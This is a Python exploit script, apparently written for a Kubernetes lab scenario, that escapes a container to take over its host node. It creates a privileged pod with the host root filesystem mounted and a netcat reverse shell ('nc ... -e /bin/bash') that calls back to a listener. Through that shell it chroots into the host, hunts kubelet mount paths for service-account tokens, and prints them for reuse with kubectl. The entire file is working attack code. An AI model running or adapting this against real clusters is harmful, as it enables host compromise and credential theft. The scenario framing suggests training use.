import time
import os
import socket
import re
from kubernetes import config, client
from kubernetes.client import Configuration
from kubernetes.client.api import core_v1_api
from kubernetes.client.rest import ApiException

K8S_ENVIRONMENT = os.environ.get('K8S_ENVIRONMENT')

if K8S_ENVIRONMENT == 'pod':
    config.load_incluster_config()
else:
    # running in ubuntu process
    config.load_config(config_file="/home/littlehawk03/.kube/config")

try:
    conf = Configuration().get_default_copy()
except:
    conf = Configuration()
    conf.assert_hostname = False
Configuration.set_default(conf)
api_server = client.CoreV1Api()


def get_pod_ip(name=None, namespace="scenario-1", **kwargs):
    if not name:
        name="compromised-pod-2"
    pod = api_server.read_namespaced_pod(name=name, namespace=namespace)
    return pod.status.pod_ip

def get_node_name(name="compromised-pod-2", namespace="scenario-1", *arg, **kwargs):
    pod = api_server.read_namespaced_pod(name=name, namespace=namespace)
    return pod.spec.node_name


def create_escape_pod(escape_pod_name="escape", namespace="scenario-1", pod_ip='0.0.0.0', reverse_port=8080, *arg, **kwargs):
    # pod_name=None
    # if K8S_ENVIRONMENT == 'pod':
    #     pod_name=os.getenv("HOSTNAME") 
    # pod_ip = get_pod_ip(name=pod_name,namespace=namespace)
    node_name = get_node_name(namespace=namespace)

    escape_pod = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": escape_pod_name,
            "labels": {
                "app": escape_pod_name
            }
        },
        "spec": {
            "nodeName": node_name,
            "containers": [
                {
                    "image": "littlehawk03/alpine:v2-bash",
                    "command": [
                        "/bin/sh",
                        "-c",
                        f"sleep 20 && nc {pod_ip} {reverse_port} -e /bin/bash"
                    ],
                    "imagePullPolicy": "IfNotPresent",
                    "volumeMounts": [
                        {
                            "mountPath": "/chroot",
                            "name": "host"
                        }
                    ],
                    "name": "escape",
                    "securityContext": {
                        "privileged": True,
                        "runAsUser": 0
                    }
                }
            ],
            "volumes": [
                {
                    "name": "host",
                    "hostPath": {
                        "path": "/",
                        "type": "Directory"
                    }
                }
            ],
            "restartPolicy": "Always"
        }
    }
    # create a escape pod
    api_server.create_namespaced_pod(body=escape_pod, namespace=namespace)
    while True:
        resp = api_server.read_namespaced_pod(name=escape_pod_name,
                                              namespace=namespace)
        if resp.status.phase != 'Pending':
            break
        time.sleep(1)
    print(
        f"Create pod {escape_pod_name} for escaping pod scenario-1 successful")



def run_list_dir_command(client_socket, step=1):
    command = "ls" + "\n"
    client_socket.send(command.encode())
    time.sleep(1)
    result = client_socket.recv(4096).decode()
    result_list = [item.strip()
                    for item in result.split("\n") if item.strip()]
    print(f"[step {step}]: Check list directory in running process:")
    print(f"[Step {step}]: Found {len(result_list)} item in path:")
    if "-------------------------------------------------------------------------" not in result:
        print(result_list)
    return result_list

def parse_os_release(output):

    data = {}
    lines = output.splitlines()

    for line in lines:
        if not line.strip():
            continue
        key, value = line.split("=", 1)
        value = value.strip('"')
        data[key.strip()] = value.strip()

    return data

def get_data_os(client_socket, step=1):
    command_1 = "cat /etc/os-release\n"
    client_socket.send(command_1.encode())
    result_os = client_socket.recv(1024).decode()
    data_os = parse_os_release(result_os)
    os_name = data_os.get("PRETTY_NAME")
    print(f"[step {step}]: The process is running in os: {os_name}")
    return os_name

def check_mount_point_from_path(client_socket, path: str, step=1):
    print(f"[Step {step}]: Starting file mount point in path: {path}")
    command= f"mount | grep {path}" + "\n"
    client_socket.send(command.encode())
    time.sleep(1)
    result = client_socket.recv(1024).decode()
    pattern = f'({path}+[^ ]+)'
    matches = re.findall(pattern, result)
    print(f"[Step {step}]: Found {len(matches)} mount path in:")
    print(matches)
    return matches

def check_item_from_path(client_socket, path: str, step=1):
    command= f"cd {path}" + "\n"
    client_socket.send(command.encode())
    time.sleep(0.5)
    item = run_list_dir_command(client_socket=client_socket, step=step)
    return item

def get_content_file(client_socket, file_name: str, step=1):
    command = f"cat {file_name}" + "\n"
    client_socket.send(command.encode())
    time.sleep(1)
    result = client_socket.recv(1024).decode()
    return result
    
def wait_for_command(client_socket):
    print("--"*50)
    # Parse 1: check reverse shell from revert shell
    result_list = run_list_dir_command(client_socket, step=1)
    previous_os = get_data_os(client_socket, step=1)

    print("--"*50)
    # Parse 2: Check chroot directory
    print("[step 2]: Escape pod successfully, check a mount state in:")
    if "chroot" in result_list:
        print("[step 2]: chroot <------- mount location")
        print("[step 2]: Run command: [chroot /chroot]")
        command_2 = "chroot /chroot" + "\n"
        client_socket.send(command_2.encode())
        time.sleep(3)

    
    print("--"*50)
    # Parse 3: Create mount point in chroot, chroot will create a sandbox environment to isolate process in machine
    print("[step 3]: Create a sandbox process running in physical machine:")
    path_file = ["-------------------------------------------------------------------------"]
    while "-------------------------------------------------------------------------" in path_file:
        path_file = check_item_from_path(client_socket, '/', step=5)
    current_os = get_data_os(client_socket, step=3)
    if previous_os != current_os:
        print("[step 3]: Successfully get in to physical machine")
        

    print("--"*50)
    # Parse 4: Create mount point in chroot, chroot will create a sandbox environment to isolate process in machine
    print("[Step 4]: Find mount point in /var/lib/kubelet/")
    mount_path = check_mount_point_from_path(client_socket, "/var/lib/kubelet/", step=4)
    

    print("--"*50)
    # Parse 5: Get token from list mount point
    print("[Step 5]: Check item in mount path:")
    for path in mount_path:
        print("[Step 5]: Checking item in path {}".format(path))
        path_file = check_item_from_path(client_socket, path, step=5)
        if len(path_file) > 0 and 'token' in path_file:
            token = get_content_file(client_socket, 'token', step=5)
            if token:
                print("[Step 5]: found the suspect token, running below command to save the token:")
                print(f"$ export TOKEN={token}")
                print("[Step 5]: To check the action that token can do by command:")
                print("$ kubectl --token=TOKEN auth can-i --list")
            break
        
    
    client_socket.close()


def running_conect_shell():
    namespace = "scenario-1"
    pod_name = None
    if K8S_ENVIRONMENT == 'pod':
        pod_name=os.getenv("HOSTNAME") 
    pod_ip = get_pod_ip(name=pod_name, namespace=namespace) if K8S_ENVIRONMENT == 'pod' else "0.0.0.0"
    node_name = get_node_name(namespace=namespace)
    print(f"Starting exploint in pod with ip {pod_ip} in node {node_name}")
    
    try:
        print("[Step 0]: Waiting connection from escape pods.......")
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((pod_ip,8080))
        server_socket.listen(1)
        
        client_socket, client_address = server_socket.accept()
        wait_for_command(client_socket)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()


def main():
    print("--"*50)
    pod_name = os.getenv("HOSTNAME")
    pod_ip = get_pod_ip(name=pod_name)
    # Parse 0: Create a escape Pod
    if K8S_ENVIRONMENT=='pod':
        create_escape_pod(pod_ip=pod_ip)
    running_conect_shell()


if __name__ == '__main__':
    main()
